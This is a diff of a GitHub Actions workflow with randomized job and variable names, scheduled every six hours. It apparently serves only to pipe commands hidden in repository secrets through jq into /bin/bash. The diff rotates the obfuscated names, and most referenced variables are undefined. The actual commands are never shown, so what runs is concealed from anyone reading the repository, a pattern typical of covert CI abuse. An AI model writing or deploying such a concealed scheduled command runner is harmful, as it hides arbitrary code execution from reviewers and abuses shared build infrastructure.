@@ -1,29 +1,24 @@
 name: luoxingeng1987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
-
-jobs:  # 30298
+    - cron: '26 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: luoxingeng1987
         env:
-          q2674: ${{ secrets.q2674 }}
+          fjhgp32885: ${{ secrets.fjhgp32885 }}
         run: |
-          echo $q2674 | jq -r .wqopv372 | /bin/bash
-          echo $qjgdm180 | jq -r .anbdt11530 | /bin/bash
-          echo $fmn76732 | jq -r .y9042 | /bin/bash
-          echo $vv27197 | jq -r .eypq8 | /bin/bash
-          echo $pfvpy81 | jq -r .gypk8 | /bin/bash
-          echo $zueh46778 | jq -r .hwst28 | /bin/bash
-          echo $a358 | jq -r .r43 | /bin/bash
-          echo $bywm29953 | jq -r .pamk026 | /bin/bash
-          echo $hy2 | jq -r .ehoco88359 | /bin/bash
-          echo $lxb24186 | jq -r .bjig3466 | /bin/bash
-          echo $lsmfn1718 | jq -r .py47225 | /bin/bash
-          echo $ktjvr82 | jq -r .hftk68 | /bin/bash
+          echo $fjhgp32885 | jq -r .d5592 | /bin/bash
+          echo $lj2 | jq -r .cjt5 | /bin/bash
+          echo $yytz649 | jq -r .b8 | /bin/bash
+          echo $ehtfv848 | jq -r .t368 | /bin/bash
+          echo $jgpl5 | jq -r .g54550 | /bin/bash
+          echo $tr17 | jq -r .cjmo463 | /bin/bash
+          echo $bci30 | jq -r .n07398 | /bin/bash
+          echo $n3296 | jq -r .m85 | /bin/bash
+          echo $rfam09 | jq -r .trsx66994 | /bin/bash
 
